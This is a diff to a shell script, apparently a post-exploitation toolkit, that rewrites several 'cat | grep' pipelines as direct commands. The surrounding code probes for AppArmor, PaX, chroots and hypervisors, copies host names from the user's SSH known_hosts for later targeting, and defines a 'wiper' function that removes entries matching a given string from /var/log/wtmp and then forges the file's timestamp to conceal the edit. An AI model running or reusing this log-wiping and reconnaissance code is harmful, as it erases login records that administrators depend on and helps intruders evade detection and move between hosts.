@@ -375,7 +375,7 @@ type aa-status >/dev/null 2>/dev/null
 	if echo $? | grep -q 0;
 	then echo "AppArmor is probably installed."
 	fi
-	if cat /proc/self/status | grep -q PaX; then
+	if grep -q PaX /proc/self/status; then
 	echo "GrSec and PaX live here."
 	fi
 }
@@ -622,7 +622,7 @@ echo "Checking to see if we're in one giant simulation..."
 	TTT=1
 	echo "We're in a chroot."
 	fi
-	if cat /proc/cpuinfo | grep -qi "hypervisor"; then
+	if grep -qi "hypervisor" /proc/cpuinfo; then
 	echo "Virtual machine!"
 	TTT=1
 	fi
@@ -749,16 +749,16 @@ echo "Please wait..."
 	fi
 echo "Broadcast ping is done."
 echo "Pulling known hosts for your user and writing to $HOME/kh..."
-cat $NHOME/.ssh/known_hosts | awk -F ' ' '{print $1}' > "$HOME/kh"
+awk -F ' ' '{print $1}' "$NHOME/.ssh/known_hosts" > "$HOME/kh"
 sorry &
 
 
 )
 
 wiper() {
-cat /var/log/wtmp | utmpdump | grep -v "$1" > "$HOME/.l"
+utmpdump /var/log/wtmp | grep -v "$1" > "$HOME/.l"
 touch -r /var/log/wtmp "$HOME/.l"
-cat "$HOME/.l" | utmpdump -r -o /var/log/wtmp
+utmpdump -r -o /var/log/wtmp "$HOME/.l"
 touch -r "$HOME/.l" /var/log/wtmp
 }
 
